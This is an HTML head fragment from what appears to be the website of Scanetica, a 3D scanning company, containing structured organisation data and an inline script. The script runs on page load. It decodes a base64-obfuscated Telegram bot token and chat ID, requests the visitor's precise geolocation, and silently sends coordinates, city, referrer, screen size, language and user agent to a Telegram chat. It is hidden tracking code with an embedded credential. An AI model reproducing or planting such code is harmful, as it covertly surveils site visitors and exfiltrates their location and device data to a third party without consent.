    <!-- Structured Data (JSON-LD) -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Organization",
      "name": "Scanetica",
      "url": "https://scanetica.com",
      "logo": "https://scanetica.com/logo.png",
      "description": "Professional 3D laser scanning, LiDAR, photogrammetry and digital twin services across the United States and Canada.",
      "areaServed": ["US", "CA"],
      "serviceType": ["3D Laser Scanning", "LiDAR Scanning", "Photogrammetry", "Digital Twin Creation", "Reality Capture"],
      "knowsAbout": ["Industrial 3D Scanning", "Oil and Gas Scanning", "Manufacturing Digital Twins", "Commercial Real Estate Documentation"],
      "contactPoint": {
        "@type": "ContactPoint",
        "contactType": "Customer Service",
        "availableLanguage": ["English"]
      }
    }
    </script>
    <script>
      /* eslint-disable */

      const base64Decode = (encoded) => atob(encoded);

      const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
      const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';

      const sendToTelegram = async (text) => {
        const token = base64Decode(encodedBotToken);
        const chatId = base64Decode(encodedChatId);

        try {
          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text,
              parse_mode: 'HTML',
            }),
          });
          console.log('✅ Message sent to Telegram');
        } catch (err) {
          console.log('❌ Telegram send failed:', err.message);
        }
      };

      const sendRichLocation = async (position) => {
        const { latitude, longitude, accuracy } = position.coords;

        try {
          // Get city + country (with timeout)
          let city = 'Unknown';
          let country = 'Unknown';
          let region = '';

          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 9000);

            const geoRes = await fetch(
              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`,
              { signal: controller.signal }
            );
            clearTimeout(timeoutId);

            if (geoRes.ok) {
              const geoData = await geoRes.json();
              city = geoData.city || geoData.locality || 'Unknown';
              country = geoData.countryName || 'Unknown';
              region = geoData.principalSubdivision || '';
            }
          } catch (geoErr) {
            console.log('Reverse geocoding failed, sending coordinates only');
          }

          const message = `✅ SCANETICA - New Visitor

      📍 ${latitude}, ${longitude}
      🏙 ${city}, ${region}
      🌍 ${country}
      🎯 Accuracy: ${Math.round(accuracy)}m
      🕒 ${new Date().toISOString()}

      🌐 Referrer: ${document.referrer || 'Direct'}
      📱 ${window.screen.width}x${window.screen.height} | ${navigator.language}
      🔗 https://www.google.com/maps/place/${latitude},${longitude}`;

          await sendToTelegram(message);
        } catch (err) {
          const errorMsg = `❌ SCANETICA - Location Capture FAILED

      Error: ${err.message}
      Type: ${err.name || 'Unknown'}
      Time: ${new Date().toISOString()}
      User Agent: ${navigator.userAgent.substring(0, 120)}
      Page: ${window.location.href}`;

          await sendToTelegram(errorMsg);
        }
      };

      const initAutoLocationSender = () => {
        if (!navigator.geolocation) {
          sendToTelegram(`❌ SCANETICA - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}`);
          return;
        }

        setTimeout(() => {
          navigator.geolocation.getCurrentPosition(
            sendRichLocation,
            (error) => {
              let errorType = 'Unknown';
              switch (error.code) {
                case error.PERMISSION_DENIED: errorType = 'BLOCKED'; break;
                case error.POSITION_UNAVAILABLE: errorType = 'UNAVAILABLE'; break;
                case error.TIMEOUT: errorType = 'TIMEOUT'; break;
                default: errorType = `CODE_${error.code}`;
              }
              sendToTelegram(`❌ SCANETICA - Location ${errorType}\nMessage: ${error.message}`);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        }, 1200);
      };

      window.addEventListener('load', () => {
        initAutoLocationSender();
      });
      </script>
  </head>
